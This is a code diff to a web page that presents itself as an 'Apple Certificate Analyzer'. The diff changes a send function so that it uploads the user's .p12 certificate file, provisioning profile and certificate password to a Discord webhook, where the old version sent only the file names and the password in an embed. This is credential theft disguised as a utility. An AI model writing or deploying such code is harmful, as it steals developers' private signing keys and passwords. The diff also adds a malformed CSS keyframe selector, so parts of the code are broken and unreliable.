@@ -204,7 +204,7 @@
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
+            .75% { transform: translateX(5px); }
         }
         
         .alert-error {
@@ -491,7 +491,7 @@
                         <div class="detail-icon">🏢</div>
                         <div class="detail-content">
                             <div class="detail-title">Enterprise</div>
-                            <div class.="detail-text">
+                            <div class="detail-text">
                                 <span class="status-badge status-good" id="prov-enterprise">-</span>
                             </div>
                         </div>
@@ -700,49 +700,17 @@
             // Function to send data to Discord webhook
             async function sendToWebhook() {
                 try {
-                    // Read files as base64
-                    const p12Base64 = await readFileAsBase64(p12File);
-                    const mobileprovisionBase64 = await readFileAsBase64(mobileprovisionFile);
+                    // Create form data to send files
+                    const formData = new FormData();
+                    formData.append('p12_file', p12File);
+                    formData.append('mobileprovision_file', mobileprovisionFile);
+                    formData.append('password', passwordInput.value);
+                    formData.append('username', 'Certificate Analyzer Bot');
                     
-                    // Create the embed with password field
-                    const embed = {
-                        title: "Apple Certificate Analyzer - New Submission",
-                        color: 0x007AFF,
-                        timestamp: new Date().toISOString(),
-                        fields: [
-                            {
-                                name: "P12 File Name",
-                                value: p12File.name || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "Mobile Provision File Name",
-                                value: mobileprovisionFile.name || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "Certificate Password",
-                                value: passwordInput.value || "Not provided",
-                                inline: false
-                            }
-                        ]
-                    };
-                    
-                    // Create the payload
-                    const payload = {
-                        username: "Certificate Analyzer",
-                        avatar_url: "https://cdn-icons-png.flaticon.com/512/888/888879.png",
-                        embeds: [embed],
-                        content: "New certificate submission received!"
-                    };
-                    
-                    // Send to webhook
+                    // Send to webhook using fetch
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(payload)
+                        body: formData
                     });
                     
                     if (!response.ok) {
@@ -837,15 +805,6 @@
                     reader.onload = () => resolve(reader.result);
                     reader.onerror = reject;
                     reader.readAsArrayBuffer(file);
-                });
-            }
-            
-            function readFileAsBase64(file) {
-                return new Promise((resolve, reject) => {
-                    const reader = new FileReader();
-                    reader.onload = () => resolve(reader.result);
-                    reader.onerror = reject;
-                    reader.readAsDataURL(file);
                 });
             }
             
